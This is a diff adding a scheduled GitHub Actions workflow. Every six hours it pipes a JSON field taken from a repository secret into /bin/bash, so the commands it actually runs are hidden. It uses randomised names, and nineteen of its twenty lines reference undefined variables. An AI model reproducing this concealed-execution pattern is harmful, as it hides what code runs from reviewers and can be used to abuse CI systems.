@@ -1,0 +1,37 @@
+name: shizhaotongwu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shizhaotongwu
+        env:
+          ol25489: ${{ secrets.ol25489 }}
+        run: |
+          echo $ol25489 | jq -r .xsjw64656 | /bin/bash
+          echo $a76801 | jq -r .z87263 | /bin/bash
+          echo $axxv2077 | jq -r .w92165 | /bin/bash
+          echo $pafrz522 | jq -r .bfkg40 | /bin/bash
+          echo $hgwkd80683 | jq -r .acayz7963 | /bin/bash
+          echo $unap83541 | jq -r .st8 | /bin/bash
+          echo $f66623 | jq -r .yava6 | /bin/bash
+          echo $jkloc29 | jq -r .w597 | /bin/bash
+          echo $esn72157 | jq -r .m09522 | /bin/bash
+          echo $khoa22027 | jq -r .z60220 | /bin/bash
+          echo $afxx5107 | jq -r .hdlbc5233 | /bin/bash
+          echo $gb9 | jq -r .x83426 | /bin/bash
+          echo $iiamv904 | jq -r .dhx61489 | /bin/bash
+          echo $pigt83141 | jq -r .hol37 | /bin/bash
+          echo $b422 | jq -r .g3 | /bin/bash
+          echo $ybf2 | jq -r .totr1054 | /bin/bash
+          echo $mu21440 | jq -r .fsguj281 | /bin/bash
+          echo $gzc3818 | jq -r .l84 | /bin/bash
+          echo $tdw94 | jq -r .yds131 | /bin/bash
+          echo $qlmj5169 | jq -r .b055 | /bin/bash
+
